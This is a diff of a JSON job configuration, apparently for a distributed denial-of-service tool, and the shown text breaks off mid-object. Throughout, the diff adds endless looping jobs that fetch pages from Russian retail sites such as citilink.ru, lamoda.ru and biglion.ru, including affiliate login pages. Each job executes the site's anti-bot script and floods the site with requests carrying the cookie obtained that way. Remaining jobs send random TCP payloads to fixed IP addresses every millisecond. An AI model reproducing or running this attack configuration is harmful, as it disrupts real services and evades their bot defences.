@@ -512,15 +512,13 @@
                 "job": {
                   "type": "sequence",
                   "args": {
-                    "jobs": [
-                      {
+                    "jobs": [{
                         "type": "set-value",
                         "name": "useragent",
                         "args": {
                           "value": "{{ random_user_agent }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "http-request",
                         "name": "initial",
                         "args": {
@@ -535,33 +533,28 @@
                             }
                           }
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "source",
                         "args": {
                           "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "extract-script",
                         "args": {
                           "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "js",
                         "name": "exec-script",
                         "args": {
                           "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "parallel",
                         "args": {
-                          "jobs": [
-                            {
+                          "jobs": [{
                               "type": "http",
                               "count": 3,
                               "args": {
@@ -617,15 +610,13 @@
                 "job": {
                   "type": "sequence",
                   "args": {
-                    "jobs": [
-                      {
+                    "jobs": [{
                         "type": "set-value",
                         "name": "useragent",
                         "args": {
                           "value": "{{ random_user_agent }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "http-request",
                         "name": "initial",
                         "args": {
@@ -640,33 +631,28 @@
                             }
                           }
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "source",
                         "args": {
                           "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "extract-script",
                         "args": {
                           "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "js",
                         "name": "exec-script",
                         "args": {
                           "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "parallel",
                         "args": {
-                          "jobs": [
-                            {
+                          "jobs": [{
                               "type": "http",
                               "count": 3,
                               "args": {
@@ -706,15 +692,13 @@
                 "job": {
                   "type": "sequence",
                   "args": {
-                    "jobs": [
-                      {
+                    "jobs": [{
                         "type": "set-value",
                         "name": "useragent",
                         "args": {
                           "value": "{{ random_user_agent }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "http-request",
                         "name": "initial",
                         "args": {
@@ -729,33 +713,28 @@
                             }
                           }
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "source",
                         "args": {
                           "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "extract-script",
                         "args": {
                           "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "js",
                         "name": "exec-script",
                         "args": {
                           "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "parallel",
                         "args": {
-                          "jobs": [
-                            {
+                          "jobs": [{
                               "type": "http",
                               "count": 3,
                               "args": {
@@ -1437,15 +1416,13 @@
                 "job": {
                   "type": "sequence",
                   "args": {
-                    "jobs": [
-                      {
+                    "jobs": [{
                         "type": "set-value",
                         "name": "useragent",
                         "args": {
                           "value": "{{ random_user_agent }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "http-request",
                         "name": "initial",
                         "args": {
@@ -1460,33 +1437,28 @@
                             }
                           }
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "source",
                         "args": {
                           "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "extract-script",
                         "args": {
                           "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "js",
                         "name": "exec-script",
                         "args": {
                           "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "parallel",
                         "args": {
-                          "jobs": [
-                            {
+                          "jobs": [{
                               "type": "http",
                               "count": 3,
                               "args": {
@@ -1695,15 +1667,13 @@
                 "job": {
                   "type": "sequence",
                   "args": {
-                    "jobs": [
-                      {
+                    "jobs": [{
                         "type": "set-value",
                         "name": "useragent",
                         "args": {
                           "value": "{{ random_user_agent }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "http-request",
                         "name": "initial",
                         "args": {
@@ -1718,33 +1688,28 @@
                             }
                           }
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "source",
                         "args": {
                           "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "extract-script",
                         "args": {
                           "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "js",
                         "name": "exec-script",
                         "args": {
                           "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "parallel",
                         "args": {
-                          "jobs": [
-                            {
+                          "jobs": [{
                               "type": "http",
                               "count": 3,
                               "args": {
@@ -1784,15 +1749,13 @@
                 "job": {
                   "type": "sequence",
                   "args": {
-                    "jobs": [
-                      {
+                    "jobs": [{
                         "type": "set-value",
                         "name": "useragent",
                         "args": {
                           "value": "{{ random_user_agent }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "http-request",
                         "name": "initial",
                         "args": {
@@ -1807,33 +1770,28 @@
                             }
                           }
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "source",
                         "args": {
                           "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "extract-script",
                         "args": {
                           "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "js",
                         "name": "exec-script",
                         "args": {
                           "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "parallel",
                         "args": {
-                          "jobs": [
-                            {
+                          "jobs": [{
                               "type": "http",
                               "count": 3,
                               "args": {
@@ -1873,15 +1831,13 @@
                 "job": {
                   "type": "sequence",
                   "args": {
-                    "jobs": [
-                      {
+                    "jobs": [{
                         "type": "set-value",
                         "name": "useragent",
                         "args": {
                           "value": "{{ random_user_agent }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "http-request",
                         "name": "initial",
                         "args": {
@@ -1896,33 +1852,28 @@
                             }
                           }
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "source",
                         "args": {
                           "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "extract-script",
                         "args": {
                           "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "js",
                         "name": "exec-script",
                         "args": {
                           "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "parallel",
                         "args": {
-                          "jobs": [
-                            {
+                          "jobs": [{
                               "type": "http",
                               "count": 3,
                               "args": {
@@ -1962,15 +1913,13 @@
                 "job": {
                   "type": "sequence",
                   "args": {
-                    "jobs": [
-                      {
+                    "jobs": [{
                         "type": "set-value",
                         "name": "useragent",
                         "args": {
                           "value": "{{ random_user_agent }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "http-request",
                         "name": "initial",
                         "args": {
@@ -1985,33 +1934,28 @@
                             }
                           }
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "source",
                         "args": {
                           "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "extract-script",
                         "args": {
                           "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "js",
                         "name": "exec-script",
                         "args": {
                           "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "parallel",
                         "args": {
-                          "jobs": [
-                            {
+                          "jobs": [{
                               "type": "http",
                               "count": 3,
                               "args": {
@@ -2051,15 +1995,13 @@
                 "job": {
                   "type": "sequence",
                   "args": {
-                    "jobs": [
-                      {
+                    "jobs": [{
                         "type": "set-value",
                         "name": "useragent",
                         "args": {
                           "value": "{{ random_user_agent }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "http-request",
                         "name": "initial",
                         "args": {
@@ -2074,33 +2016,28 @@
                             }
                           }
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "source",
                         "args": {
                           "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "set-value",
                         "name": "extract-script",
                         "args": {
                           "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "js",
                         "name": "exec-script",
                         "args": {
                           "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
                         }
-                      },
-                      {
+                      }, {
                         "type": "parallel",
                         "args": {
-                          "jobs": [
-                            {
+                          "jobs": [{
                               "type": "http",
                               "count": 3,
                               "args": {
@@ -2128,77 +2065,84 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "loop",
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://items.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://banners.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://banners.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://content.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://content.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:443",
-            "is_tls": "true"
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "http://banners.s1.citilink.ru/",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "http://banners.s1.citilink.ru/",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
           }
         }
       }
@@ -3479,51 +3423,6 @@
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.lamoda.ru/men-home/?sitelink=topmenuM"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.232.33:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://affiliates.lamoda.ru/partner/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.232.33:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://affiliates-kz.lamoda.ru/partner/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.232.33:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
       "count": 3,
       "args": {
@@ -3588,21 +3487,6 @@
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://job.lamoda.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.51:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
       "count": 3,
       "args": {
@@ -3617,21 +3501,6 @@
         "address": "178.248.234.51:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://gatemgmt.lamoda.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.51:443",
-            "is_tls": "true"
-          }
-        }
       }
     }, {
       "type": "tcp",
@@ -3814,21 +3683,6 @@
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://biggeek.ru/catalog/apple-iphone-13-pro-max"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.239.88:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
       "count": 3,
       "args": {
@@ -3843,21 +3697,6 @@
         "address": "178.248.233.88:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://re-store.ru/apple-iphone/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.233.88:443",
-            "is_tls": "true"
-          }
-        }
       }
     }, {
       "type": "tcp",
@@ -4002,21 +3841,6 @@
         "address": "178.248.233.61:80",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.techport.ru/katalog/products/otdelnostojaschaja-bytovaja-tehnika"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.233.61:80",
-            "is_tls": "false"
-          }
-        }
       }
     }, {
       "type": "tcp",
@@ -4569,36 +4393,6 @@
         "address": "178.248.238.249:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://price.ru/bytovaya-tehnika/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.238.249:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://biz.price.ru/welcome"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.238.249:443",
-            "is_tls": "true"
-          }
-        }
       }
     }, {
       "type": "tcp",
@@ -5372,21 +5166,6 @@
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.kolesa-darom.ru/catalog/avto/akkumulyatory/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.235.204:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
       "count": 3,
       "args": {
@@ -6134,6 +5913,1236 @@
         "address": "95.213.159.133:2759",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://content.s1.citilink.ru/",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://content.s1.citilink.ru/",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://www.biglion.ru/shops/kupons/",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://www.biglion.ru/shops/kupons/",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://www.lamoda.ru/men-home/?sitelink=topmenuM",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://www.lamoda.ru/men-home/?sitelink=topmenuM",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://affiliates.lamoda.ru/partner/login",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://affiliates.lamoda.ru/partner/login",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://affiliates-kz.lamoda.ru/partner/login",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://affiliates-kz.lamoda.ru/partner/login",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://www.lamoda.ru/men-home/?sitelink=topmenuM",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://www.lamoda.ru/men-home/?sitelink=topmenuM",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://www.lamoda.ru/men-home/?sitelink=topmenuM",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
